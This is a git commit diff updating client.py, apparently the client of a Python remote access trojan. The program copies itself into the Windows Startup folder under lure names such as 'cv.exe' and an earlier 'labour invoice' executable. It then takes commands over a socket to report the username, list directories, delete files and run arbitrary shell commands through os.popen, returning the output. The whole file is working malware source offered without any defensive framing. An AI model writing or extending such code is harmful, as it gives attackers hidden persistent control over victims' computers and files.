1169bb3c3c4bfba0727a26b1e9d54ef70f57e666
semihcelik8 <81470723+semihcelik8@users.noreply.github.com>
2022-04-02 22:49:20 +0300

    Update client.py

--- client.py
+++ client.py
@@ -1,18 +1,21 @@
 import socket
 import os
 import shutil
-import pyautogui
+import subprocess
 
 user = os.getlogin()
 directory = os.getcwd()
-path = "C:\\Users\\" + str(user) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\iscilikfaturası.exe"
-des = str(directory) +"\iscilikfaturası.exe"
+path = "C:\\Users\\" + str(user) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\cv.exe"
+des = str(directory) +"\cv.exe"
 print(des)
 
-if os.path.exists(path):
-    print("file is exists")
-else:
-    shutil.copy(des, path)
+try:
+    if os.path.exists(path):
+        print("file is exists")
+    else:
+        shutil.copy(des, path)
+except:
+    print("Error: File could not find...")
 
 while True:
     while True:
@@ -30,13 +33,27 @@ while True:
         if data == "user":
             s.sendall(user.encode("utf-8"))
         elif data == "tree":
-            tree_input_data = (s.recv(1024)).decode("utf-8")
-            tree_data = str(os.listdir(tree_input_data))
-            s.sendall(tree_data.encode("utf-8"))
+            tree_input_data = (s.recv(2048)).decode("utf-8")
+            try:
+                tree_data = str(os.listdir(tree_input_data))
+                s.sendall(tree_data.encode("utf-8"))
+            except:
+                s.sendall("Could not find directory...".encode("utf-8"))
         elif data == "del":
             del_input_data = (s.recv(1024)).decode("utf-8")
             os.remove(del_input_data)
-        elif data == "screenshot":
-            ss_input_data = (s.recv(1024)).decode("utf-8")
-            screenshot = pyautogui.screenshot()
-            screenshot.save(ss_input_data)
+        elif data == "startup":
+            try:
+                if os.path.exists(path):
+                    print("file is exists")
+                    s.sendall("File exists".encode("utf-8"))
+                else:
+                    shutil.copy(des, path)
+            except:
+                s.sendall("Error: File could not find...".encode("utf-8"))
+        elif data == "command":
+            command_data = (s.recv(2048)).decode("utf-8")
+            command_data_return = os.popen('"' + command_data + '"')
+            send = command_data_return.read()
+            s.sendall(send.encode("utf-8"))
+            command_data_return.close()
